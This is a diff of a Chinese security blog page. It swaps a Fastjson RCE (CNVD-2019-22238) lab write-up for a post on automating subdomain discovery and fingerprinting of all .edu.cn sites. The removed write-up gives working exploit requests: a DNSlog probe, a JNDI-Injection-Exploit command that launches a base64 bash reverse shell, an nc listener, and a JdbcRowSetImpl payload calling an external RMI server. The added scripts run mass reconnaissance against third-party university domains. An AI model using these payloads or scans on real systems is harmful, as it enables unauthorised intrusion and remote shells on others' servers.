@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    Fastjson远程代码执行CNVD-2019-22238 |  Yaowen&#39;s blog
+    web打点-全网edu网站指纹识别-脚本全自动化 |  Yaowen&#39;s blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-Fastjson远程代码执行CNVD-2019-22238"
+  id="post-web打点-全网edu网站指纹识别-脚本全自动化"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -55,22 +55,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Fastjson远程代码执行CNVD-2019-22238
+  web打点-全网edu网站指纹识别-脚本全自动化
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" class="article-date">
-  <time datetime="2023-01-06T16:18:11.955Z" itemprop="datePublished">2023-01-07</time>
+      <a href="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/" class="article-date">
+  <time datetime="2023-01-06T22:17:53.211Z" itemprop="datePublished">2023-01-07</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">966</span>
+            <span class="post-count">901</span>
         </span>
     </span>
 
@@ -94,29 +94,30 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>以前都没怎么写技术有关的文章，可能是觉得自己写的会不好，误导别人。现在，自认为有点实力了，就写些漏洞复现的文章压压筋，另外一个原因就是，在复现找文章总是会出现各种问题，所以，我觉得还是自己写文章，做记录，这样以后又遇到类似的问题就可以看自己写的文章解决了。</p>
-<h3 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h3><p> Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象 Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。 </p>
-<h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>我用的是vulfoucs靶场复现的，fastjson&lt;=1.2.24，由于fastjson版本不同payload也会有所不同，所以这里提前声明一下。</p>
-<p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106232719456.png" alt="image-20230106232719456"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要步骤 </span><br><span class="line">1.通过dnslog检测漏洞是否存在</span><br><span class="line">2.在公网vps上通过JNDI-Injection-Exploit工具搭建ladp和rmi服务</span><br><span class="line">3.通过rmi协议加载恶意类，利用bash反弹shell</span><br></pre></td></tr></table></figure>
-<p>工具下载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit.git</span><br></pre></td></tr></table></figure>
-<p>1.通过dns记录简单检测是否存在漏洞，我这里用的是<code>dnslog.cn</code>.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:30205</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;13uw56.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>注意: 双引号和逗号都是英文的，复制之后注意检查，还有注意<code>Content-Type: application/json</code>,提交方式为<code>POST</code></p>
-<p>返回包没有报错就是一般就是利用成功了</p>
-<p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231837457.png" alt="image-20230106231837457"></p>
-<p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106230659916.png" alt="image-20230106230659916"></p>
-<p>2.在vps上通过JNDI-Injection-Exploit工具搭建ldap&amp;rmi服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64加密的bash反弹shell payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;vps的ip地址&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231218516.png" alt="image-20230106231218516"></p>
-<p>这里的bash 反弹shell可以去<code>https://www.revshells.com/</code>这个网站生成，然后进行base64编码即可。</p>
-<p>3.通过rmi协议请求恶意类，从而执行bash反弹shell的代码，同时在vps上同时监听对应的端口```nc -lvvp [port]``，这里设置的监听端口是利用bash反弹shell的端口</p>
-<p>不同版本payload有所不同，这里的版本<code>fastjson&lt;=1.2.24</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:32132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;123.249.90.73:1099&#x2F;fanobj&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>成功反弹shell获取到flag</p>
-<p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230107000209003.png" alt="image-20230107000209003"></p>
-<p>打完，收工，早上10点打ctf比赛，嘿嘿！</p>
+  <h3 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h3><ol>
+<li><p>先通过fofa搜索全网的edu网站，导出到本地，将结果复制到urls.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa: host&#x3D;&quot;.edu.cn&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107062110192.png" alt="image-20230107062110192"></p>
+</li>
+</ol>
+<ol start="2">
+<li><p>编写python脚本，对urls.txt文件中重复主站点的url进行删除，然后再自动化调用subfinder进行子域名搜集，把子域名搜索结果分别保存到以主站点为名的csv文件中。之后，再写一个调用Finger(python编写的一款指纹识别工具)的脚本，对每个主站点的子域名进行指纹识别。</p>
+<p><img src="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064006952.png" alt="image-20230107064006952"></p>
+</li>
+</ol>
+<h3 id="0x01-具体实现"><a href="#0x01-具体实现" class="headerlink" title="0x01 具体实现"></a>0x01 具体实现</h3><p>这里直接给出我写的两个脚本，一个是调用subfinder实现自动化，另一个是调用finger实现自动化</p>
+<ul>
+<li>auto_serach_domain.py</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">去掉重复的域名</span><br><span class="line">调用subfinder查找子域名</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">def get_main_domain(url):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    对子域名进行处理，返回主域名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    url &#x3D; url.split(&quot;.&quot;)</span><br><span class="line">    url[-1] &#x3D; url[-1].replace(&#39;\n&#39;, &#39;&#39;)</span><br><span class="line">    url &#x3D; url[-3]+&#39;.&#39;+url[-2]+&#39;.&#39;+url[-1]</span><br><span class="line">    if &quot;&#x2F;&#x2F;&quot; in url:</span><br><span class="line">        url &#x3D; url.replace(&#39;http:&#x2F;&#x2F;&#39;,&#39;&#39;).replace(&#39;https:&#x2F;&#x2F;&#39;,&#39;&#39;)</span><br><span class="line">    if &quot;:&quot; in url:</span><br><span class="line">        url &#x3D; url.split(&#39;:&#39;)[0]</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line">def move_again_domain(url_list):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    对域名进行去重处理</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    return list(set(url_list))</span><br><span class="line"></span><br><span class="line">def run(url):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    调用subfinder查找子域名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    save_file &#x3D; url + &#39;.csv&#39;</span><br><span class="line">    command &#x3D; f&#39;subfinder.exe -d &#123;url&#125; -all -nW -oI -o &#123;save_file&#125;&#39;</span><br><span class="line">    print(f&quot;[+] current run command: &#123;command&#125;&quot;)</span><br><span class="line">    print(f&#39;[+] current search url: &#123;url&#125;&#39;)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    u &#x3D; []</span><br><span class="line">    with open(&#39;urls.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        urls &#x3D; f.readlines()</span><br><span class="line">        for url in urls:</span><br><span class="line">            url &#x3D; get_main_domain(url)</span><br><span class="line">            u.append(url)</span><br><span class="line">    u &#x3D; move_again_domain(u)</span><br><span class="line">    for url in u:</span><br><span class="line">        run(url)</span><br><span class="line">    # with open(&#39;u.txt&#39;,&#39;w&#39;) as f:</span><br><span class="line">    #     for url in u:</span><br><span class="line">    #         f.write(url + &#39;\n&#39;)</span><br><span class="line">    print(&quot;[+] Done!!!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>auto_run_finger.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import csv</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re </span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import csv         #导入csv模块</span><br><span class="line">try:</span><br><span class="line">    file&#x3D;open(&#39;stu_info.csv&#39;,&#39;r&#39;)  #打开文件</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&#39;文件不存在&#39;)</span><br><span class="line">else:</span><br><span class="line">    stus&#x3D;csv.reader(file)         #读取文件内容</span><br><span class="line">    for stu in stus:             #一行是一个数组</span><br><span class="line">        print(stu[0])             #取每个数组的第一个元素</span><br><span class="line"></span><br><span class="line">从csv文件中取出url</span><br><span class="line">自动识别资产</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">def get_csv_data(csv_file):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    从csv文件中获取第一列的数据</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    u &#x3D; []</span><br><span class="line">    with open(csv_file,&#39;r&#39;) as f:</span><br><span class="line">        o &#x3D; csv.reader(f)</span><br><span class="line">        for data in o:</span><br><span class="line">            u.append(data[0])</span><br><span class="line">    return u</span><br><span class="line"></span><br><span class="line">def run(command&#x3D;&#39;&#39;):</span><br><span class="line">    print(f&quot;[+] Current run command:&#123;command&#125;&quot;)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">def write_file(u,filename&#x3D;&#39;urls.txt&#39;):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    将队列中的url保存到txt中,并以对应的域名进行命名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    with open(filename,&#39;w&#39;) as f:</span><br><span class="line">        for url in u:</span><br><span class="line">            f.write(url+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">def get_dir_csv(path):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    获取path目录下所有的csv文件, 并返回一个列表</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    csv_list &#x3D; []</span><br><span class="line">    for root, dirs, files in os.walk(path):</span><br><span class="line">        for f in files:</span><br><span class="line">            if &#39;csv&#39; in f:</span><br><span class="line">                csv_list.append(f)</span><br><span class="line">    return root,csv_list</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    csv_file_path&#x3D; sys.argv[1] # 保存域名的csv文件目录</span><br><span class="line">    root,csv_dir_list &#x3D; get_dir_csv(path&#x3D;csv_file_path)</span><br><span class="line">    </span><br><span class="line">    for csv_filename in csv_dir_list:</span><br><span class="line">        csv_filename &#x3D; root + &#39;\\&#39; + csv_filename</span><br><span class="line">        u &#x3D; get_csv_data(csv_filename)</span><br><span class="line">        file_name &#x3D; re.search(r&#39;[a-z]&#123;1,10&#125;.edu.cn.csv.csv&#39;, csv_filename).group().replace(&#39;.csv&#39;, &#39;&#39;)</span><br><span class="line">        print(f&#39;[+] save file name &#123;file_name&#125;&#39;)</span><br><span class="line">        write_file(u,file_name)</span><br><span class="line">        run(command&#x3D;f&#39;python .\Finger.py -f &#123;file_name&#125;&#39;)</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    print(&quot;Usage:python auto_run_finger.py [file]&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        banner()</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064154752.png" alt="image-20230107064154752"></p>
+<p><img src="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107063935418.png" alt="image-20230107063935418"></p>
+</li>
+</ul>
+<h3 id="0x02-最后想说的"><a href="#0x02-最后想说的" class="headerlink" title="0x02 最后想说的"></a>0x02 最后想说的</h3><p>这些是我在凌晨看HVV有关 web打点的文章时，突然冒出来的想法，其实以前也有过自动化的想法，奈何一直没有合适机会，这次总算是开始了。</p>
  
       <!-- reward -->
       
@@ -188,7 +189,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://ggfgh.github.io/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -199,19 +200,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/01/07/web%E6%89%93%E7%82%B9-%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            web打点-全网edu网站指纹识别-脚本全自动化
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-nav-link">
+      <a href="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">php代码审计_mvc框架审计_文件上传笔记</div>
+        <div class="article-nav-title">Fastjson远程代码执行CNVD-2019-22238</div>
       </a>
     
   </nav>
